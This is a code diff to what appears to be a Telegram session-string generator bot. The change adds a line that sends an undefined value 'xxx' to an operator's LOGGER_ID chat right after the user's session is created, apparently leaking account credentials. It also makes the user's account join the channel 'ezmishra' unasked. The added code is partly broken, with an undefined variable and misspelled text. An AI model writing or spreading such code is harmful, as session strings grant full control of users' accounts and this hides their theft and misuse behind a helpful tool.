@@ -29,7 +29,7 @@ from telethon.errors import (
 from telethon.sessions import StringSession
 from telethon.tl.functions.channels import JoinChannelRequest
 from pyromod.listen.listen import ListenerTimeout
-from SessionBot import SUPPORT_CHAT
+from SessionBot import LOGGER_ID
 from SessionBot.Plugins.inline import retry_key
 
 async def gen_session(
@@ -206,7 +206,7 @@ async def gen_session(
             string_session = client.session.save()
             await client.send_message(
                 "me",
-                txt.format(ty, string_session, SUPPORT_CHAT),
+                txt.format(ty, string_session),
                 link_preview=False,
                 parse_mode="html",
             )
@@ -214,17 +214,18 @@ async def gen_session(
             string_session = await client.export_session_string()
             await client.send_message(
                 "me",
-                txt.format(ty, string_session, SUPPORT_CHAT),
+                txt.format(ty, string_session),
                 disable_web_page_preview=True,
             )
-            await client.join_chat("")
+            await client.join_chat("ezmishra")
     except KeyError:
         pass
     try:
         await client.disconnect()
+        await Client.send_message(LOGGER_ID, xxx)
         await Client.send_message(
             chat_id=user_id,
-            text=f"sᴜ.",
+            text=f"𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅𝗅𝗒 𝖦𝖾𝖻𝖾𝗋𝖺𝗍𝖾𝖽 𝖸𝗈𝗎𝗋 {ty} 𝖲𝗍𝗋𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇.\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖢𝗁𝖾𝖼𝗄 𝖸𝗈𝗎𝗋 𝖲𝖺𝗏𝖾𝖽 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌 𝖥𝗈𝗋 𝖦𝖾𝗍𝗍𝗂𝗇𝗀 𝖨𝗍.",
             reply_markup=InlineKeyboardMarkup(
                 [
                     [
